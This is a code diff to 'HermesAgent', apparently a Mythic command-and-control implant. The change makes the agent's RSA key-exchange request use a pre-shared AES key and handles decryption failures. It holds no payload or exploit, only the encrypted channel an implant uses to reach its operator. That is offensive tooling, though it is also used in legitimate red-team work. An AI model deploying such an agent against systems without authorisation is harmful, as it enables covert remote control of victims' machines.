@@ -415,6 +415,17 @@ class HermesAgent:
         return enc
 
     def _negotiate_key(self):
+        # Per Mythic docs, the staging_rsa exchange is encrypted with the AESPSK.
+        # Temporarily use it so _send() encrypts the request and decrypts the response.
+        staging_key = None
+        if (CONFIG_AESPSK or "").strip():
+            try:
+                k = base64.b64decode(CONFIG_AESPSK.strip())
+                if len(k) == 32:
+                    staging_key = k
+            except Exception:
+                pass
+
         pub_pem, priv = rsa_keygen()
         msg = {
             "action": "staging_rsa",
@@ -422,7 +433,9 @@ class HermesAgent:
             "session_id": str(uuid_mod.uuid4()),
         }
         body = json.dumps(msg).encode("utf-8")
-        resp = self._send(body, encrypt=False)
+        self.aes_key = staging_key
+        resp = self._send(body, encrypt=staging_key is not None)
+        self.aes_key = None
         if not resp:
             return False
         try:
@@ -434,7 +447,10 @@ class HermesAgent:
         if not session_key_b64:
             return False
         key_enc = base64.b64decode(session_key_b64)
-        key_dec = rsa_decrypt_oaep(priv, key_enc)
+        try:
+            key_dec = rsa_decrypt_oaep(priv, key_enc)
+        except Exception:
+            return False
         self.aes_key = key_dec
         if new_uuid:
             self.mythic_id = new_uuid
